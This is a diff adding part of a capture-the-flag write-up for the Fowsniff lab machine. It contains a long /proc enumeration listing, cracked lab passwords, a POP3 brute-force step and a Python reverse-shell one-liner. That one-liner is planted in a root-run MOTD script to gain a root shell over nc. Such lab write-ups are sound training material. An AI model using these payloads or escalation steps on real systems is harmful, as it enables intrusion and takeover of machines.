@@ -507,3 +507,512 @@ uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
 /home/baksteen/.bashrc
 /sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/tasks
 /sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/cgroup.procs
+/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/tasks
+/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/cgroup.procs
+/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/cgroup.clone_children
+/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/notify_on_release
+/proc/1146/task/1146/fdinfo/0
+/proc/1146/task/1146/fdinfo/1
+/proc/1146/task/1146/fdinfo/2
+/proc/1146/task/1146/fdinfo/3
+/proc/1146/task/1146/fdinfo/4
+/proc/1146/task/1146/fdinfo/5
+/proc/1146/task/1146/fdinfo/6
+/proc/1146/task/1146/fdinfo/7
+/proc/1146/task/1146/fdinfo/8
+/proc/1146/task/1146/fdinfo/9
+/proc/1146/task/1146/fdinfo/10
+/proc/1146/task/1146/fdinfo/11
+/proc/1146/task/1146/fdinfo/12
+/proc/1146/task/1146/fdinfo/13
+/proc/1146/task/1146/fdinfo/14
+/proc/1146/task/1146/environ
+/proc/1146/task/1146/auxv
+/proc/1146/task/1146/status
+/proc/1146/task/1146/personality
+/proc/1146/task/1146/limits
+/proc/1146/task/1146/sched
+/proc/1146/task/1146/comm
+/proc/1146/task/1146/syscall
+/proc/1146/task/1146/cmdline
+/proc/1146/task/1146/stat
+/proc/1146/task/1146/statm
+/proc/1146/task/1146/maps
+/proc/1146/task/1146/children
+/proc/1146/task/1146/numa_maps
+/proc/1146/task/1146/mem
+/proc/1146/task/1146/mounts
+/proc/1146/task/1146/mountinfo
+/proc/1146/task/1146/clear_refs
+/proc/1146/task/1146/smaps
+/proc/1146/task/1146/pagemap
+/proc/1146/task/1146/attr/current
+/proc/1146/task/1146/attr/prev
+/proc/1146/task/1146/attr/exec
+/proc/1146/task/1146/attr/fscreate
+/proc/1146/task/1146/attr/keycreate
+/proc/1146/task/1146/attr/sockcreate
+/proc/1146/task/1146/wchan
+/proc/1146/task/1146/stack
+/proc/1146/task/1146/schedstat
+/proc/1146/task/1146/cpuset
+/proc/1146/task/1146/cgroup
+/proc/1146/task/1146/oom_score
+/proc/1146/task/1146/oom_adj
+/proc/1146/task/1146/oom_score_adj
+/proc/1146/task/1146/loginuid
+/proc/1146/task/1146/sessionid
+/proc/1146/task/1146/io
+/proc/1146/task/1146/uid_map
+/proc/1146/task/1146/gid_map
+/proc/1146/task/1146/projid_map
+/proc/1146/task/1146/setgroups
+/proc/1146/fdinfo/0
+/proc/1146/fdinfo/1
+/proc/1146/fdinfo/2
+/proc/1146/fdinfo/3
+/proc/1146/fdinfo/4
+/proc/1146/fdinfo/5
+/proc/1146/fdinfo/6
+/proc/1146/fdinfo/7
+/proc/1146/fdinfo/8
+/proc/1146/fdinfo/9
+/proc/1146/fdinfo/10
+/proc/1146/fdinfo/11
+/proc/1146/fdinfo/12
+/proc/1146/fdinfo/13
+/proc/1146/fdinfo/14
+/proc/1146/environ
+/proc/1146/auxv
+/proc/1146/status
+/proc/1146/personality
+/proc/1146/limits
+/proc/1146/sched
+/proc/1146/autogroup
+/proc/1146/comm
+/proc/1146/syscall
+/proc/1146/cmdline
+/proc/1146/stat
+/proc/1146/statm
+/proc/1146/maps
+/proc/1146/numa_maps
+/proc/1146/mem
+/proc/1146/mounts
+/proc/1146/mountinfo
+/proc/1146/mountstats
+/proc/1146/clear_refs
+/proc/1146/smaps
+/proc/1146/pagemap
+/proc/1146/attr/current
+/proc/1146/attr/prev
+/proc/1146/attr/exec
+/proc/1146/attr/fscreate
+/proc/1146/attr/keycreate
+/proc/1146/attr/sockcreate
+/proc/1146/wchan
+/proc/1146/stack
+/proc/1146/schedstat
+/proc/1146/cpuset
+/proc/1146/cgroup
+/proc/1146/oom_score
+/proc/1146/oom_adj
+/proc/1146/oom_score_adj
+/proc/1146/loginuid
+/proc/1146/sessionid
+/proc/1146/coredump_filter
+/proc/1146/io
+/proc/1146/uid_map
+/proc/1146/gid_map
+/proc/1146/projid_map
+/proc/1146/setgroups
+/proc/1146/timers
+/proc/1172/task/1172/fdinfo/0
+/proc/1172/task/1172/fdinfo/1
+/proc/1172/task/1172/fdinfo/2
+/proc/1172/task/1172/fdinfo/255
+/proc/1172/task/1172/environ
+/proc/1172/task/1172/auxv
+/proc/1172/task/1172/status
+/proc/1172/task/1172/personality
+/proc/1172/task/1172/limits
+/proc/1172/task/1172/sched
+/proc/1172/task/1172/comm
+/proc/1172/task/1172/syscall
+/proc/1172/task/1172/cmdline
+/proc/1172/task/1172/stat
+/proc/1172/task/1172/statm
+/proc/1172/task/1172/maps
+/proc/1172/task/1172/children
+/proc/1172/task/1172/numa_maps
+/proc/1172/task/1172/mem
+/proc/1172/task/1172/mounts
+/proc/1172/task/1172/mountinfo
+/proc/1172/task/1172/clear_refs
+/proc/1172/task/1172/smaps
+/proc/1172/task/1172/pagemap
+/proc/1172/task/1172/attr/current
+/proc/1172/task/1172/attr/prev
+/proc/1172/task/1172/attr/exec
+/proc/1172/task/1172/attr/fscreate
+/proc/1172/task/1172/attr/keycreate
+/proc/1172/task/1172/attr/sockcreate
+/proc/1172/task/1172/wchan
+/proc/1172/task/1172/stack
+/proc/1172/task/1172/schedstat
+/proc/1172/task/1172/cpuset
+/proc/1172/task/1172/cgroup
+/proc/1172/task/1172/oom_score
+/proc/1172/task/1172/oom_adj
+/proc/1172/task/1172/oom_score_adj
+/proc/1172/task/1172/loginuid
+/proc/1172/task/1172/sessionid
+/proc/1172/task/1172/io
+/proc/1172/task/1172/uid_map
+/proc/1172/task/1172/gid_map
+/proc/1172/task/1172/projid_map
+/proc/1172/task/1172/setgroups
+/proc/1172/fdinfo/0
+/proc/1172/fdinfo/1
+/proc/1172/fdinfo/2
+/proc/1172/fdinfo/255
+/proc/1172/environ
+/proc/1172/auxv
+/proc/1172/status
+/proc/1172/personality
+/proc/1172/limits
+/proc/1172/sched
+/proc/1172/autogroup
+/proc/1172/comm
+/proc/1172/syscall
+/proc/1172/cmdline
+/proc/1172/stat
+/proc/1172/statm
+/proc/1172/maps
+/proc/1172/numa_maps
+/proc/1172/mem
+/proc/1172/mounts
+/proc/1172/mountinfo
+/proc/1172/mountstats
+/proc/1172/clear_refs
+/proc/1172/smaps
+/proc/1172/pagemap
+/proc/1172/attr/current
+/proc/1172/attr/prev
+/proc/1172/attr/exec
+/proc/1172/attr/fscreate
+/proc/1172/attr/keycreate
+/proc/1172/attr/sockcreate
+/proc/1172/wchan
+/proc/1172/stack
+/proc/1172/schedstat
+/proc/1172/cpuset
+/proc/1172/cgroup
+/proc/1172/oom_score
+/proc/1172/oom_adj
+/proc/1172/oom_score_adj
+/proc/1172/loginuid
+/proc/1172/sessionid
+/proc/1172/coredump_filter
+/proc/1172/io
+/proc/1172/uid_map
+/proc/1172/gid_map
+/proc/1172/projid_map
+/proc/1172/setgroups
+/proc/1172/timers
+/proc/1192/task/1192/fdinfo/0
+/proc/1192/task/1192/fdinfo/1
+/proc/1192/task/1192/fdinfo/2
+/proc/1192/task/1192/fdinfo/3
+/proc/1192/task/1192/fdinfo/4
+/proc/1192/task/1192/fdinfo/5
+/proc/1192/task/1192/fdinfo/7
+/proc/1192/task/1192/fdinfo/8
+/proc/1192/task/1192/fdinfo/9
+/proc/1192/task/1192/fdinfo/10
+/proc/1192/task/1192/environ
+/proc/1192/task/1192/auxv
+/proc/1192/task/1192/status
+/proc/1192/task/1192/personality
+/proc/1192/task/1192/limits
+/proc/1192/task/1192/sched
+/proc/1192/task/1192/comm
+/proc/1192/task/1192/syscall
+/proc/1192/task/1192/cmdline
+/proc/1192/task/1192/stat
+/proc/1192/task/1192/statm
+/proc/1192/task/1192/maps
+/proc/1192/task/1192/children
+/proc/1192/task/1192/numa_maps
+/proc/1192/task/1192/mem
+/proc/1192/task/1192/mounts
+/proc/1192/task/1192/mountinfo
+/proc/1192/task/1192/clear_refs
+/proc/1192/task/1192/smaps
+/proc/1192/task/1192/pagemap
+/proc/1192/task/1192/attr/current
+/proc/1192/task/1192/attr/prev
+/proc/1192/task/1192/attr/exec
+/proc/1192/task/1192/attr/fscreate
+/proc/1192/task/1192/attr/keycreate
+/proc/1192/task/1192/attr/sockcreate
+/proc/1192/task/1192/wchan
+/proc/1192/task/1192/stack
+/proc/1192/task/1192/schedstat
+/proc/1192/task/1192/cpuset
+/proc/1192/task/1192/cgroup
+/proc/1192/task/1192/oom_score
+/proc/1192/task/1192/oom_adj
+/proc/1192/task/1192/oom_score_adj
+/proc/1192/task/1192/loginuid
+/proc/1192/task/1192/sessionid
+/proc/1192/task/1192/io
+/proc/1192/task/1192/uid_map
+/proc/1192/task/1192/gid_map
+/proc/1192/task/1192/projid_map
+/proc/1192/task/1192/setgroups
+/proc/1192/fdinfo/0
+/proc/1192/fdinfo/1
+/proc/1192/fdinfo/2
+/proc/1192/fdinfo/3
+/proc/1192/fdinfo/4
+/proc/1192/fdinfo/6
+/proc/1192/fdinfo/7
+/proc/1192/environ
+/proc/1192/auxv
+/proc/1192/status
+/proc/1192/personality
+/proc/1192/limits
+/proc/1192/sched
+/proc/1192/autogroup
+/proc/1192/comm
+/proc/1192/syscall
+/proc/1192/cmdline
+/proc/1192/stat
+/proc/1192/statm
+/proc/1192/maps
+/proc/1192/numa_maps
+/proc/1192/mem
+/proc/1192/mounts
+/proc/1192/mountinfo
+/proc/1192/mountstats
+/proc/1192/clear_refs
+/proc/1192/smaps
+/proc/1192/pagemap
+/proc/1192/attr/current
+/proc/1192/attr/prev
+/proc/1192/attr/exec
+/proc/1192/attr/fscreate
+/proc/1192/attr/keycreate
+/proc/1192/attr/sockcreate
+/proc/1192/wchan
+/proc/1192/stack
+/proc/1192/schedstat
+/proc/1192/cpuset
+/proc/1192/cgroup
+/proc/1192/oom_score
+/proc/1192/oom_adj
+/proc/1192/oom_score_adj
+/proc/1192/loginuid
+/proc/1192/sessionid
+/proc/1192/coredump_filter
+/proc/1192/io
+/proc/1192/uid_map
+/proc/1192/gid_map
+/proc/1192/projid_map
+/proc/1192/setgroups
+/proc/1192/timers
+
+baksteen@fowsniff:~$ cd /opt/cube
+baksteen@fowsniff:/opt/cube$ cat cube.sh
+printf "
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| '__| '_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions\n\n"
+
+baksteen@fowsniff:/opt/cube$ which python
+baksteen@fowsniff:/opt/cube$ which python3
+/usr/bin/python3
+baksteen@fowsniff:/opt/cube$ nano cube.sh 
+
+add revshell
+
+baksteen@fowsniff:/opt/cube$ cat cube.sh
+printf "
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| '__| '_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions\n\n"
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.1.77",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+baksteen@fowsniff:/opt/cube$ cd /etc/update-motd.d/
+baksteen@fowsniff:/etc/update-motd.d$ ls
+00-header  10-help-text  91-release-upgrade  99-esm
+baksteen@fowsniff:/etc/update-motd.d$ cat 00-header 
+#!/bin/sh
+#
+```
+```text
+#    00-header - create the header of the MOTD
+```
+```text
+#    Copyright (C) 2009-2010 Canonical Ltd.
+#
+```
+```text
+#    Authors: Dustin Kirkland <kirkland@canonical.com>
+#
+```
+```text
+#    This program is free software; you can redistribute it and/or modify
+```
+```text
+#    it under the terms of the GNU General Public License as published by
+```
+```text
+#    the Free Software Foundation; either version 2 of the License, or
+```
+```text
+#    (at your option) any later version.
+#
+```
+```text
+#    This program is distributed in the hope that it will be useful,
+```
+```text
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+```
+```text
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+```
+```text
+#    GNU General Public License for more details.
+#
+```
+```text
+#    You should have received a copy of the GNU General Public License along
+```
+```text
+#    with this program; if not, write to the Free Software Foundation, Inc.,
+```
+```text
+#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+
+#[ -r /etc/lsb-release ] && . /etc/lsb-release
+
+#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
+```
+```text
+#       # Fall back to using the very slow lsb_release utility
+```
+```text
+#       DISTRIB_DESCRIPTION=$(lsb_release -s -d)
+#fi
+
+#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
+
+sh /opt/cube/cube.sh
+
+exit ssh then login and use nc to get root
+
+baksteen@fowsniff:/etc/update-motd.d$ exit
+logout
+Connection to 10.10.178.83 closed.
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh baksteen@10.10.178.83
+baksteen@10.10.178.83's password: S1ck3nBluff+secureshell
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -nlvp 1337
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.178.83.
+Ncat: Connection from 10.10.178.83:59396.
+/bin/sh: 0: can't access tty; job control turned off
+```
+```text
+# whoami;id;cat /root/flag.txt
+root
+uid=0(root) gid=0(root) groups=0(root)
+   ___                        _        _      _   _             _ 
+  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
+ | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
+  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
+               |___/ 
+
+ (_)
+  |--------------
+  |&&&&&&&&&&&&&&|
+  |    R O O T   |
+  |    F L A G   |
+  |&&&&&&&&&&&&&&|
+  |--------------
+  |
+  |
+  |
+  |
+  |
+  |
+ ---
+
+Nice work!
+
+This CTF was built with love in every byte by @berzerk0 on Twitter.
+
+Special thanks to psf, @nbulischeck and the whole Fofao Team.
+```
+Deploy the machine. On the top right of this you will see a Deploy button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live.
+Using nmap, scan this machine. What ports are open?
+nmap -A -p- -sV 10.10.178.83
+Using the information from the open ports. Look around. What can you find?
+Using Google, can you find any public information about them?
+There is a pastebin with all of the company employees emails and hashes. If the pastebin is down, check out TheWayBackMachine, or https://github.com/berzerk0/Fowsniff
+Can you decode these md5 hashes? You can even use sites like hashkiller to decode them.
+Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
+In metasploit there is a packages called: auxiliary/scanner/pop3/pop3_login where you can enter all the usernames and passwords you found to brute force this machines pop3 service.
+What was seina's password to the email service?
+*scoobydoo2*
+Can you connect to the pop3 service with her credentials? What email information can you gather?
+Use netcat with the port 110 to view her emails. nc </ip> 110
+Looking through her emails, what was a temporary password set for her?
+*S1ck3nBluff+secureshell*
+In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
+Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
+cube.sh
+Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?
+Python Reverse Shell:
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+Other reverse shells: here.
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+Use a python reverse shell (make sure it runs as python3)
+If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in /etc/update-motd.d/ file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!
+Run the cube file to the motd.d file.
+Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!
+If you are really really stuck, there is a brilliant walkthrough here: https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/
+If its easier, follow this walkthrough with the deployed machine on the site.
+
+## Notes / Lessons Learned
+[[CyberHeroes]]
+
